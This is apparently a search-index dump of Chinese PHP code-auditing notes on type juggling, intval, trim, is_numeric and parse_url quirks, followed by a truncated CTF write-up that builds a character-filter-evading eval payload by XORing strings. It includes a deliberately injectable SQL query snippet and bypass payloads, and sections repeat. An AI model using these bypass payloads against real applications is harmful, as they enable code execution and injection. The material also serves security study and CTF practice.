'00000000012345678' '0010e2' == '1e3' '123000' == '123e3' '123000e2' == '123e5' # true in 5.2.1+ # false in PHP 4.3.0 - 5.2.0 '608E-4234' == '272E-3063' # true in PHP 4.3.0 - 5.6.x # false in 7.0.0+ '0e0' == '0x0' '0xABC' == '0xabc' '0xABCdef' == '0xabcDEF' '000000e1' == '0x000000' '0xABFe1' == '0xABFE1' '0xe' == '0Xe' '0xABCDEF' == '11259375' '0xABCDEF123' == '46118400291' '0x1234AB' == '1193131' '0x1234Ab' == '1193131' # true in PHP 4.3.0 - 4.3.9, 5.2.1 - 5.6.x # false in PHP 4.3.10 - 4.4.9, 5.0.3 - 5.2.0, 7.0.0+ '0xABCdef' == ' 0xabcDEF' '1e1' == '0xa' '0xe' == ' 0Xe' '0x123' == ' 0x123' # true in PHP 4.3.10 - 4.4.9, 5.0.3 - 5.2.0 # false in PHP 4.3.0 - 4.3.9, 5.0.0 - 5.0.2, 5.2.1 - 5.6.26, 7.0.0+ '0e0' == '0x0a' # true in PHP 4.3.0 - 4.3.9, 5.0.0 - 5.0.2 # false in PHP 4.3.10 - 4.4.9, 5.0.3 - 5.6.26, 7.0.0+ '0xe' == ' 0Xe.' intval \u00b6 intval() \u5728\u8f6c\u6362\u7684\u65f6\u5019\uff0c\u4f1a\u4ece\u5b57\u7b26\u4e32\u7684\u5f00\u59cb\u8fdb\u884c\u8f6c\u6362\u76f4\u5230\u9047\u5230\u4e00\u4e2a\u975e\u6570\u5b57\u7684\u5b57\u7b26\u3002\u5373\u4f7f\u51fa\u73b0\u65e0\u6cd5\u8f6c\u6362\u7684\u5b57\u7b26\u4e32\uff0c intval() \u4e0d\u4f1a\u62a5\u9519\u800c\u662f\u8fd4\u56de 0\u3002 1 2 3 4 5 6 7 8 9 10 11 12 var_dump(intval('2')) // 2 var_dump(intval('3abcd')) // 3 var_dump(intval('abcd')) // 0 var_dump(0 == '0'); // true var_dump(0 == 'abcdefg'); // true var_dump(0 === 'abcdefg'); // false var_dump(1 == '1abcdef'); // true if(intval($a) > 1000) { mysql_query(\"select * from news where id=\".$a) } trim \u00b6 trim \u51fd\u6570\u4f1a\u8fc7\u6ee4\u7a7a\u683c\u4ee5\u53ca \\n\\r\\t\\v\\0\uff0c\u4f46\u4e0d\u4f1a\u8fc7\u6ee4\u8fc7\u6ee4\\f 1 2 $a = \" \\n\\r\\t\\v\\0abc \\f\"; var_dump(trim($a)); // abc \\f \u5229\u7528 trim \u53ca is_numeric \u7b49\u51fd\u6570\u5b9e\u73b0\u7684\u7ed5\u8fc7: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 <?php // %0c1%00 $number = \"\\f1 \\0 \" ; // trim \u51fd\u6570\u4f1a\u8fc7\u6ee4 \\n\\r\\t\\v\\0\uff0c\u4f46\u4e0d\u4f1a\u8fc7\u6ee4\u8fc7\u6ee4\\f $number_2 = trim ( $number ); var_dump ( $number_2 ); // \\f1 $number_2 = addslashes ( $number_2 ); var_dump ( $number_2 ); // \\f1 // is_numeric \u68c0\u6d4b\u7684\u65f6\u5019\u4f1a\u8fc7\u6ee4\u6389 '', '\\t', '\\n', '\\r', '\\v', '\\f' \u7b49\u5b57\u7b26 // \u4f46\u662f\u4e0d\u4f1a\u8fc7\u6ee4 '\\0' var_dump ( is_numeric ( $number )); // false var_dump ( strval ( intval ( $number_2 ))); // 1 var_dump ( \"\\f1\" == \"1\" ); // true ?> \u5c1d\u8bd5\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 php > $number = \"\\f1\\0\"; php > $number_2 = trim($number); php > var_dump($number_2); string(2) \" 1\" // \\f\u5b57\u7b26\u6b64\u5904\u4e0d\u53ef\u6253\u5370 php > $number_2 = addslashes($number_2); php > var_dump($number_2); string(2) \" 1\" php > var_dump(is_numeric($number)); bool(false) php > var_dump(is_numeric($number_2)); bool(true) php > var_dump(\"\\f1\" == \"1\"); bool(true) is_numeric \u00b6 PHP\u63d0\u4f9b\u4e86is_numeric\u51fd\u6570\uff0c\u7528\u6765\u53d8\u91cf\u5224\u65ad\u662f\u5426\u4e3a\u6570\u5b57\u3002\u4f46\u662f\u51fd\u6570\u7684\u8303\u56f4\u6bd4\u8f83\u5e7f\u6cdb\uff0c\u4e0d\u4ec5\u4ec5\u662f\u5341\u8fdb\u5236\u7684\u6570\u5b57\u3002 1 2 3 4 5 6 7 8 <?php echo is_numeric ( 233333 ); // 1 echo is_numeric ( '233333' ); // 1 echo is_numeric ( 0x233333 ); // 1 echo is_numeric ( '0x233333' ); // 1 echo is_numeric ( '9e9' ); // 1 echo is_numeric ( '233333abc' ); // 0 ?> is_numeric \u68c0\u6d4b\u7684\u65f6\u5019\u4f1a\u81ea\u52a8\u8fc7\u6ee4\u6389\u524d\u9762\u7684 \u2018 \u2018, \u2018\\t\u2019, \u2018\\n\u2019, \u2018\\r\u2019, \u2018\\v\u2019, \u2018\\f\u2019 \u7b49\u5b57\u7b26\uff0c\u4f46\u662f\u4e0d\u4f1a\u8fc7\u6ee4 \u2018\\0\u2019\uff0c\u5982\u679c\u8fd9\u4e9b\u5b57\u7b26\u51fa\u73b0\u5728\u5b57\u7b26\u4e32\u5c3e\uff0c\u4e5f\u4e0d\u4f1a\u8fc7\u6ee4\uff0c\u800c\u662f\u8fd4\u56de false 1 2 3 4 5 6 7 8 9 10 11 var_dump(is_numeric(\"\\01\")); // false var_dump(is_numeric(\" 1\")); // true var_dump(is_numeric(\"\\t1\")); // true var_dump(is_numeric(\"\\n1\")); // true var_dump(is_numeric(\"\\r1\")); // true var_dump(is_numeric(\"\\v1\")); // true var_dump(is_numeric(\"\\f1\")); // true var_dump(is_numeric(\"\\f\\f1\")); // true var_dump(is_numeric(\"1\\f\")); // false \u6570\u7ec4\u4e0e\u5b57\u7b26\u4e32 \u00b6 \u5f53 $var \u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\u7684\u65f6\u5019\uff0c\u8bbf\u95ee $var[\"any string\"] \u8ddf\u8bbf\u95ee $var[intval(\"any string\")] \u6548\u679c\u662f\u4e00\u6837\u7684\u3002\u5982\u679c\u6709\u53d8\u91cf\u8986\u76d6\uff0c\u53ef\u4ee5\u5b9e\u73b0\u4e00\u4e9b\u7ed5\u8fc7\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 php > $userinfo = 'abcdefg'; php > $userinfo['id'] = 123; PHP Warning: Illegal string offset 'id' in php shell code on line 1 php > print_r($userinfo); 1bcdefg php > print_r($userinfo['id']); PHP Warning: Illegal string offset 'id' in php shell code on line 1 1 php > $userinfo['role'] = 1; PHP Warning: Illegal string offset 'role' in php shell code on line 1 php > print_r($userinfo['role']); PHP Warning: Illegal string offset 'role' in php shell code on line 1 1 php > print_r($userinfo); 1bcdefg php > var_dump($userinfo); string(7) \"1bcdefg\" \u53c2\u8003 \u00b6 \u5ba1\u8ba1","title":"\u5ba1\u8ba1\u5c0f\u77e5\u8bc6"},{"location":"audit/audit7/#_1","text":"","title":"\u5ba1\u8ba1\u5c0f\u77e5\u8bc6"},{"location":"audit/audit7/#_2","text":"1 2 3 4 5 6 7 8 9 $GLOBALS // \u5f15\u7528\u5168\u5c40\u4f5c\u7528\u57df\u4e2d\u53ef\u7528\u7684\u5168\u90e8\u53d8\u91cf $_POST // \u83b7\u53d6 post \u6570\u636e\uff0c\u662f\u4e00\u4e2a\u5b57\u5178 $_GET // \u83b7\u53d6 get \u6570\u636e\uff0c\u662f\u4e00\u4e2a\u5b57\u5178 $_COOKIE // \u83b7\u53d6 cookie $_SESSION // \u83b7\u53d6 session $_FILES // \u83b7\u53d6\u4e0a\u4f20\u7684\u6587\u4ef6 $_REQUEST // \u83b7\u53d6 $_GET\uff0c$_POST\uff0c$_COOKIE \u4e2d\u7684\u6570\u636e $_ENV // \u73af\u5883\u53d8\u91cf $_SERVER // \u670d\u52a1\u5668\u548c\u6267\u884c\u73af\u5883\u4fe1\u606f","title":"\u7cfb\u7edf\u53d8\u91cf\uff08\u8d85\u5168\u5c40\u53d8\u91cf\uff09"},{"location":"audit/audit7/#_3","text":"1 2 3 4 5 6 7 $a=\"hello\"; // \u5b9a\u4e49\u53ef\u53d8\u53d8\u91cf\u65f6\uff0c\u53ef\u4ee5\u52a0\u4e0a\u5927\u62ec\u53f7 ${$a}=\"world\"; echo ${$a}; echo $$a; // \u5c06\u666e\u901a\u53d8\u91cf\u7684\u503c hello\uff0c\u4f5c\u4e3a\u53ef\u53d8\u53d8\u91cf\u7684\u53d8\u91cf\u540d\uff0c\u5373 $a echo $hello;","title":"$ \u5bfc\u81f4\u7684\u53d8\u91cf\u8986\u76d6"},{"location":"audit/audit7/#_4","text":"1 2 3 $str='hello'; echo \"str is $str\"; // \u8fd0\u884c\u7ed3\u679c : str is hello echo 'str is $str'; // \u8fd0\u884c\u7ed3\u679c : str is $str","title":"\u53cc\u5f15\u53f7\u89e3\u6790\u53d8\u91cf\uff0c\u5355\u5f15\u53f7\u4e0d\u89e3\u6790\u53d8\u91cf"},{"location":"audit/audit7/#_5","text":"1 2 3 4 5 6 7 8 9 php > var_dump($a); PHP Notice: Undefined variable: a in php shell code on line 1 NULL php > var_dump($a==0); PHP Notice: Undefined variable: a in php shell code on line 1 bool(true) php > var_dump($a+1); PHP Notice: Undefined variable: a in php shell code on line 1 int(1) //\u4e8e\u662f\u53ef\u4ee5\u901a\u8fc7\u672a\u5b9a\u4e49\u53d8\u91cf\u6765\u83b7\u5f97\u6570\u503c","title":"\u672a\u5b9a\u4e49\u53d8\u91cf"},{"location":"audit/audit7/#_6","text":"glob \u51fd\u6570 scandir \u51fd\u6570","title":"\u6587\u4ef6\u64cd\u4f5c\u76f8\u5173"},{"location":"audit/audit7/#_get_post","text":"\u5982\u679c GET \u53c2\u6570\u4e2d\u8bbe\u7f6e name[]=a \uff0c\u90a3\u4e48 $_GET['name'] = [a] \uff0cphp \u4f1a\u628a []=a \u5f53\u6210\u6570\u7ec4\u4f20\u5165\uff0c $_GET \u4f1a\u81ea\u52a8\u5bf9\u53c2\u6570\u8c03\u7528 urldecode \u3002 $_POST \u540c\u6837\u5b58\u5728\u6b64\u6f0f\u6d1e\uff0c\u63d0\u4ea4\u7684\u8868\u5355\u6570\u636e\uff0c user[]=admin \uff0c $_POST['user'] \u5f97\u5230\u7684\u662f ['admin'] \u662f\u4e00\u4e2a\u6570\u7ec4\u3002","title":"$_GET\u548c$_POST\u4f20\u5165\u6570\u7ec4"},{"location":"audit/audit7/#strcmp-strcasecmp","text":"strcmp \u548c strcasecmp\uff08\u4e0d\u533a\u5206\u5927\u5c0f\u5199\uff09 \u7528\u4e8e\u6bd4\u8f83\u5b57\u7b26\u4e32\uff0c\u8fd4\u56de\u503c\u5982\u4e0b\uff1a \u5982\u679c str1 \u5c0f\u4e8e str2 \u8fd4\u56de < 0\uff1b \u5982\u679c str1 \u5927\u4e8e str2 \u8fd4\u56de > 0\uff1b \u5982\u679c\u4e24\u8005\u76f8\u7b49\uff0c\u8fd4\u56de 0\u3002 5.2 \u4e2d\u662f\u5c06\u4e24\u4e2a\u53c2\u6570\u5148\u8f6c\u6362\u6210string\u7c7b\u578b\u3002 5.3.3 \u4ee5\u540e\uff0c\u5f53\u6bd4\u8f83\u6570\u7ec4\u548c\u5b57\u7b26\u4e32\u7684\u65f6\u5019\uff0c\u8fd4\u56de\u662f0\u3002 5.5 \u4e2d\u5982\u679c\u53c2\u6570\u4e0d\u662fstring\u7c7b\u578b\uff0c\u76f4\u63a5return\u4e86","title":"strcmp \u548c strcasecmp"},{"location":"audit/audit7/#null","text":"1 2 3 4 5 6 7 php > $array=[1, 2, 3]; php > var_dump(strcmp($array, 'abc')); PHP Warning: strcmp() expects parameter 1 to be string, array given in php shell code on line 1 NULL //\u67d0\u79cd\u7a0b\u5ea6\u5c31\u662f0 php > var_dump(strcasecmp($array, 'abc')); PHP Warning: strcasecmp() expects parameter 1 to be string, array given in php shell code on line 1 NULL","title":"\u6570\u7ec4\u8ddf\u5b57\u7b26\u4e32\u6bd4\u8f83\u4f1a\u8fd4\u56de NULL"},{"location":"audit/audit7/#parse_url","text":"parse_url() \u51fd\u6570\u53ef\u4ee5\u89e3\u6790 URL\uff0c\u8fd4\u56de\u5176\u7ec4\u6210\u90e8\u5206\uff0c\u6b64\u51fd\u6570\u5e76\u4e0d\u610f\u5473\u7740\u7ed9\u5b9a\u7684 URL \u662f\u5408\u6cd5\u7684\uff0c\u5b83\u53ea\u662f\u5c06\u4e0a\u65b9\u5217\u8868\u4e2d\u7684\u5404\u90e8\u5206\u5206\u5f00\u3002parse_url() \u53ef\u63a5\u53d7\u4e0d\u5b8c\u6574\u7684 URL\uff0c\u5e76\u5c3d\u91cf\u5c06\u5176\u89e3\u6790\u6b63\u786e\u3002 \u6b63\u5e38\u60c5\u51b5\u4e0b\uff1a 1 2 3 4 5 6 7 8 php > $url = 'http://prontosil.club'; php > var_dump(parse_url($url)); array(2) { [\"scheme\"]=> string(4) \"http\" [\"host\"]=> string(14) \"prontosil.club\" } \u4f46\u662f\u5f53\u4e00\u4e2aurl\u6ca1\u6709\u534f\u8bae\u7684\u65f6\u5019\uff0c\u4f46\u662f\u7ed9\u4e00\u4e2a\u7aef\u53e3url\u7684\u5b57\u7b26\u4e32\u7684\u65f6\u5019parse_url\u5c31\u4f1a\u7206\u9519\u3002\u8fd9\u4e2a\u7ecf\u6d4b\u8bd5\u5728windows\u4e0b\u5e94\u8be5\u662fphp\u7248\u672c\u5168\u901a\u6740\u7684(5.2-7.0)\uff0clinux\u6ca1\u6d4b\u8bd5\u8fc7\u3002 1 2 3 php > $url = '/pupiles.com:80'; php > var_dump(parse_url($url)); bool(false) \u53ea\u8981\u7aef\u53e3\u540e\u9762\u8ddf\u5b57\u6bcd\u8fd8\u662f\u4f1a\u89e3\u6790\uff0c\u6bd4\u5982 1 2 3 4 5 6 php > $url = '/pupiles.com:80a'; php > var_dump(parse_url($url)); array(1) { [\"path\"]=> string(16) \"/pupiles.com:80a\" }","title":"parse_url"},{"location":"audit/audit7/#_7","text":"1 2 3 4 5 6 7 8 9 // php5.5\u4ee5\u4e0a\u8fd9\u6837\u7684url\u7528parse_url\u89e3\u6790\u540e\u9884\u6d4b\u7684\u7ed3\u679c\u662f //pupiles.com/about:1234 array(2) { [\"host\"]=> string(11) \"pupiles.com\" [\"path\"]=> string(9) \"/about:1234\" } \u7136\u800c\u5b9e\u9645\u4e0a\uff1a 1 2 3 4 5 6 7 8 9 10 php > $url = 'pupiles.com/about:1234'; php > var_dump(parse_url($url)); array(3) { [\"host\"]=> string(11) \"pupiles.com\" [\"port\"]=> int(1234) [\"path\"]=> string(11) \"/about:1234\" } \u4f1a\u9ed8\u8ba4\u89e3\u6790\u51fa\u4e00\u4e2aportkey","title":"\u7aef\u53e3\u89e3\u6790\u9519\u8bef"},{"location":"audit/audit7/#_8","text":"1 2 3 4 5 6 7 8 php > print_r($uri); /upload?/home/binarycloud/ php > print_r(parse_url($uri)); Array ( [path] => /upload [query] => /home/binarycloud/ ) 1 2 3 4 5 6 7 php > $uri = \"//upload?/home/binarycloud/\"; php > print_r(parse_url($uri)); Array ( [host] => upload [query] => /home/binarycloud/ )","title":"\u8def\u5f84\u89e3\u6790\u9519\u8bef"},{"location":"audit/audit7/#_9","text":"\u5728php5.3.13\u7248\u672c\u4ee5\u4e0b\uff0c\u5f53\u8f93\u5165\u5982\u4e0burl 1 http://pupiles:78325 \u6309\u7167\u6b63\u5e38\u6765\u8bf4\u5e94\u8be5\u4f1a\u8fd4\u56defalse\uff0c\u4f46\u662f\u8fd9\u91cc\u4f1a\u8fd4\u56de 1 2 3 4 5 array(3) { [\"scheme\"]=> string(4) \"http\" [\"host\"]=> string(7) \"pupiles\" [\"port\"]=> int(12789) } php=5.5.38\u5982\u4e0b\uff1a 1 2 3 php > $uri = 'http://pupiles:78325'; php > var_dump(parse_url($uri)); bool(false)","title":"\u7aef\u53e3\u6ea2\u51fa"},{"location":"audit/audit7/#_10","text":"\u5f53\u4e00\u4e2a\u6574\u5f62\u548c\u4e00\u4e2a\u5176\u4ed6\u7c7b\u578b\u884c\u6bd4\u8f83\u7684\u65f6\u5019\uff0c\u4f1a\u5148\u628a\u5176\u4ed6\u7c7b\u578b intval \u518d\u6bd4\u8f83 bool\u7c7b\u578b\u7684 true \u8ddf\u4efb\u610f\u5b57\u7b26\u4e32\u53ef\u4ee5\u5f31\u7c7b\u578b\u76f8\u7b49 1 2 3 4 5 6 7 8 9 10 11 1 == '1abc' // true true == 'abcd' // true \"42\" == \"42.0\" // true \"42\" == \"000042.00\" // true \"42\" == \"0x000000002A\" // true \"10\" == \"1e1\" // true \"42\" == \"0000000004.2E+1\" // true \"42\" == \"42.0e+000000\" // true [false] == [0] == [NULL] == [''] NULL == false == 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 '0.999999999999999999999' == 1 # true in PHP 4.3.0+ '0e0' == '0e1' '0e0' == '0E1' '10e2' == ' 01e3' '10e2' == '01e3' '10e2' == '1e3' '010e2' == '1e3' '010e2' == '01e3' '10' == '010' '10.0' == '10' '10' == '00000000010' '12345678' == '00000000012345678' '0010e2' == '1e3' '123000' == '123e3' '123000e2' == '123e5' # true in 5.2.1+ # false in PHP 4.3.0 - 5.2.0 '608E-4234' == '272E-3063' # true in PHP 4.3.0 - 5.6.x # false in 7.0.0+ '0e0' == '0x0' '0xABC' == '0xabc' '0xABCdef' == '0xabcDEF' '000000e1' == '0x000000' '0xABFe1' == '0xABFE1' '0xe' == '0Xe' '0xABCDEF' == '11259375' '0xABCDEF123' == '46118400291' '0x1234AB' == '1193131' '0x1234Ab' == '1193131' # true in PHP 4.3.0 - 4.3.9, 5.2.1 - 5.6.x # false in PHP 4.3.10 - 4.4.9, 5.0.3 - 5.2.0, 7.0.0+ '0xABCdef' == ' 0xabcDEF' '1e1' == '0xa' '0xe' == ' 0Xe' '0x123' == ' 0x123' # true in PHP 4.3.10 - 4.4.9, 5.0.3 - 5.2.0 # false in PHP 4.3.0 - 4.3.9, 5.0.0 - 5.0.2, 5.2.1 - 5.6.26, 7.0.0+ '0e0' == '0x0a' # true in PHP 4.3.0 - 4.3.9, 5.0.0 - 5.0.2 # false in PHP 4.3.10 - 4.4.9, 5.0.3 - 5.6.26, 7.0.0+ '0xe' == ' 0Xe.'","title":"\u5f31\u7c7b\u578b"},{"location":"audit/audit7/#intval","text":"intval() \u5728\u8f6c\u6362\u7684\u65f6\u5019\uff0c\u4f1a\u4ece\u5b57\u7b26\u4e32\u7684\u5f00\u59cb\u8fdb\u884c\u8f6c\u6362\u76f4\u5230\u9047\u5230\u4e00\u4e2a\u975e\u6570\u5b57\u7684\u5b57\u7b26\u3002\u5373\u4f7f\u51fa\u73b0\u65e0\u6cd5\u8f6c\u6362\u7684\u5b57\u7b26\u4e32\uff0c intval() \u4e0d\u4f1a\u62a5\u9519\u800c\u662f\u8fd4\u56de 0\u3002 1 2 3 4 5 6 7 8 9 10 11 12 var_dump(intval('2')) // 2 var_dump(intval('3abcd')) // 3 var_dump(intval('abcd')) // 0 var_dump(0 == '0'); // true var_dump(0 == 'abcdefg'); // true var_dump(0 === 'abcdefg'); // false var_dump(1 == '1abcdef'); // true if(intval($a) > 1000) { mysql_query(\"select * from news where id=\".$a) }","title":"intval"},{"location":"audit/audit7/#trim","text":"trim \u51fd\u6570\u4f1a\u8fc7\u6ee4\u7a7a\u683c\u4ee5\u53ca \\n\\r\\t\\v\\0\uff0c\u4f46\u4e0d\u4f1a\u8fc7\u6ee4\u8fc7\u6ee4\\f 1 2 $a = \" \\n\\r\\t\\v\\0abc \\f\"; var_dump(trim($a)); // abc \\f \u5229\u7528 trim \u53ca is_numeric \u7b49\u51fd\u6570\u5b9e\u73b0\u7684\u7ed5\u8fc7: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 <?php // %0c1%00 $number = \"\\f1 \\0 \" ; // trim \u51fd\u6570\u4f1a\u8fc7\u6ee4 \\n\\r\\t\\v\\0\uff0c\u4f46\u4e0d\u4f1a\u8fc7\u6ee4\u8fc7\u6ee4\\f $number_2 = trim ( $number ); var_dump ( $number_2 ); // \\f1 $number_2 = addslashes ( $number_2 ); var_dump ( $number_2 ); // \\f1 // is_numeric \u68c0\u6d4b\u7684\u65f6\u5019\u4f1a\u8fc7\u6ee4\u6389 '', '\\t', '\\n', '\\r', '\\v', '\\f' \u7b49\u5b57\u7b26 // \u4f46\u662f\u4e0d\u4f1a\u8fc7\u6ee4 '\\0' var_dump ( is_numeric ( $number )); // false var_dump ( strval ( intval ( $number_2 ))); // 1 var_dump ( \"\\f1\" == \"1\" ); // true ?> \u5c1d\u8bd5\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 php > $number = \"\\f1\\0\"; php > $number_2 = trim($number); php > var_dump($number_2); string(2) \" 1\" // \\f\u5b57\u7b26\u6b64\u5904\u4e0d\u53ef\u6253\u5370 php > $number_2 = addslashes($number_2); php > var_dump($number_2); string(2) \" 1\" php > var_dump(is_numeric($number)); bool(false) php > var_dump(is_numeric($number_2)); bool(true) php > var_dump(\"\\f1\" == \"1\"); bool(true)","title":"trim"},{"location":"audit/audit7/#is_numeric","text":"PHP\u63d0\u4f9b\u4e86is_numeric\u51fd\u6570\uff0c\u7528\u6765\u53d8\u91cf\u5224\u65ad\u662f\u5426\u4e3a\u6570\u5b57\u3002\u4f46\u662f\u51fd\u6570\u7684\u8303\u56f4\u6bd4\u8f83\u5e7f\u6cdb\uff0c\u4e0d\u4ec5\u4ec5\u662f\u5341\u8fdb\u5236\u7684\u6570\u5b57\u3002 1 2 3 4 5 6 7 8 <?php echo is_numeric ( 233333 ); // 1 echo is_numeric ( '233333' ); // 1 echo is_numeric ( 0x233333 ); // 1 echo is_numeric ( '0x233333' ); // 1 echo is_numeric ( '9e9' ); // 1 echo is_numeric ( '233333abc' ); // 0 ?> is_numeric \u68c0\u6d4b\u7684\u65f6\u5019\u4f1a\u81ea\u52a8\u8fc7\u6ee4\u6389\u524d\u9762\u7684 \u2018 \u2018, \u2018\\t\u2019, \u2018\\n\u2019, \u2018\\r\u2019, \u2018\\v\u2019, \u2018\\f\u2019 \u7b49\u5b57\u7b26\uff0c\u4f46\u662f\u4e0d\u4f1a\u8fc7\u6ee4 \u2018\\0\u2019\uff0c\u5982\u679c\u8fd9\u4e9b\u5b57\u7b26\u51fa\u73b0\u5728\u5b57\u7b26\u4e32\u5c3e\uff0c\u4e5f\u4e0d\u4f1a\u8fc7\u6ee4\uff0c\u800c\u662f\u8fd4\u56de false 1 2 3 4 5 6 7 8 9 10 11 var_dump(is_numeric(\"\\01\")); // false var_dump(is_numeric(\" 1\")); // true var_dump(is_numeric(\"\\t1\")); // true var_dump(is_numeric(\"\\n1\")); // true var_dump(is_numeric(\"\\r1\")); // true var_dump(is_numeric(\"\\v1\")); // true var_dump(is_numeric(\"\\f1\")); // true var_dump(is_numeric(\"\\f\\f1\")); // true var_dump(is_numeric(\"1\\f\")); // false","title":"is_numeric"},{"location":"audit/audit7/#_11","text":"\u5f53 $var \u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\u7684\u65f6\u5019\uff0c\u8bbf\u95ee $var[\"any string\"] \u8ddf\u8bbf\u95ee $var[intval(\"any string\")] \u6548\u679c\u662f\u4e00\u6837\u7684\u3002\u5982\u679c\u6709\u53d8\u91cf\u8986\u76d6\uff0c\u53ef\u4ee5\u5b9e\u73b0\u4e00\u4e9b\u7ed5\u8fc7\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 php > $userinfo = 'abcdefg'; php > $userinfo['id'] = 123; PHP Warning: Illegal string offset 'id' in php shell code on line 1 php > print_r($userinfo); 1bcdefg php > print_r($userinfo['id']); PHP Warning: Illegal string offset 'id' in php shell code on line 1 1 php > $userinfo['role'] = 1; PHP Warning: Illegal string offset 'role' in php shell code on line 1 php > print_r($userinfo['role']); PHP Warning: Illegal string offset 'role' in php shell code on line 1 1 php > print_r($userinfo); 1bcdefg php > var_dump($userinfo); string(7) \"1bcdefg\"","title":"\u6570\u7ec4\u4e0e\u5b57\u7b26\u4e32"},{"location":"audit/audit7/#_12","text":"\u5ba1\u8ba1","title":"\u53c2\u8003"},{"location":"audit/code-breaking/","text":"code-breaking \u00b6","title":"code-breaking"},{"location":"audit/code-breaking/#code-breaking","text":"","title":"code-breaking"},{"location":"audit/easyphp/","text":"EasyPHP (871 points) \u00b6 Description \u00b6 Don't try to run any Linux command, just use all the PHP functions you know to get the flag http://165.22.57.95:8000/ First look \u00b6 Visiting given URL gives us a look at the source file: 1 2 3 4 5 6 7 8 9 10 11 12 <?php highlight_file ( __FILE__ ); $_ = @ $_GET [ '_' ]; if ( preg_match ( '/[\\x00- 0-9\\'\"`$&.,|[{_defgops\\x7F]+/i' , $_ ) ) die ( 'ros\u00e9 will not do it' ); if ( strlen ( count_chars ( strtolower ( $_ ), 0x3 )) > 0xd ) die ( 'you are so close, omg' ); eval ( $_ ); ?> So there are two conditions we have to satisfy in order to eval our code. Analysis of preg_match condition let us determine all the characters and php functions we can explicitly use without any encoding. I made an assumption, that php configuration is default, so to have first look-around I parsed result of get_defined_functions() php function using given regex condition. This gives us following set of functions: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 bcmul rtrim trim ltrim chr link unlink tan atan atanh tanh intval mail min max At a first glance, functions chr and intval look promising - we could possibly craft both characters and numbers. However, to do so, we need numbers to craft strings from (as we cant use any string quotes) e.g: chr(asciicode) . Looking for a right path \u00b6 How can we generate numbers then? There comes PHP syntax and behaviour with help! Basically in PHP strings have to be quoted using \" or ' . Although those characters are restricted by regex condition, PHP acts in pretty weird way, if we don't quote string - it assumes we've simply forgotten to quote it, produces notice and creates string anyway (only a-ZA-Z characters are valid in this case). Also, notice can be easily suppressed using @ which is permitted by regex. How can we get number from string, though? In this case we can simply use PHP's amazing type juggling: 1 2 3 <?php $a = !!@ i ; echo $a ; // produces boolean(true) String i is casted to false via ! operator, then negated by another ! and we have logical true . Booleans are casted to integer, when any arithmetic is used on them, so we can produce any number we want! For example: 1 2 <?php echo ( !!@ i + !!@ i ) ** ( !!@ i + !!@ i + !!@ i + !!@ i ); //outputs 2^4 = 16 Cool! Now we can create any number and one-char string using chr(asciinumber) function. Another usable PHP feature in our case is that we can call functions using strings. For example \"phpinfo\"(); equals phpinfo(); Now we have one-char-strings and ability to call functions using strings. There are not much one-char functions though - to be specific there's only one: _() which is alias for gettext() function which is used to translate strings. Not very useful. The plan now is to find a way to create string - either by concatenating one-letter strings or any method. I've spent long hours trying to figure out how to concatenate strings without using . operator (which is exactly string concatenation operator, but forbidden by regex), but I've been failing and failing... After hours of struggle, the very next morning I've re-analysed regex condition once again (for like 10 th time), and focused on operators allowed. Those are: ['!', '%', '+', '-', '*', '/', '>', '<', '?', '=', ':', '@', '^'] Eventually I noticed something interesting in PHP documentation: https://www.php.net/manual/en/language.operators.bitwise.php If both operands for the &, | and ^ operators are strings, then the operation will be performed on the ASCII values of the characters that make up the strings and the result will be a string. In all other cases, both operands will be converted to integers and the result will be an integer. This is exactly what we need. ^ stands for bitwise XOR, and if applied on strings, it XORs char by char. I have also tried out some XOR results, and it turned out, that it is possible to create lowercase characters by XORing uppercase character with a number, for example: 1 echo @ASD^\"123\"; //produces string 'paw' We already know how to create string using only permitted characters, and also how to create any number we want. If only number was string representation of integer, we could determine pairs of Uppercase letter ^ [0-9] which XORED result in ANY functions names! Next step is to create string representation for crafted number. Again, PHP type juggling arrives on a white horse yelling for attention: 1 2 <?php var_dump ( trim ( 123 )); //produces string(3) \"123\" trim(string $str) function takes string for argument, and if integer provided, simply casts it to string and returns it trimmed - this is our way to convert crafted numbers to strings. Exploitation \u00b6 Off we go, ready and steady to begin exploitation. I've written script which simply iterates through available characters and helps me to find possible Letter ^ [0-9] pairs for each character in provided function name and further generates payload which is encoded function name string. Having this I generated phpinfo(); string: 1 2 \"AQAQVQV\" ^ \"1918879\" //produces 'phpinfo' Payload: (AQAQVQV^trim(((((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!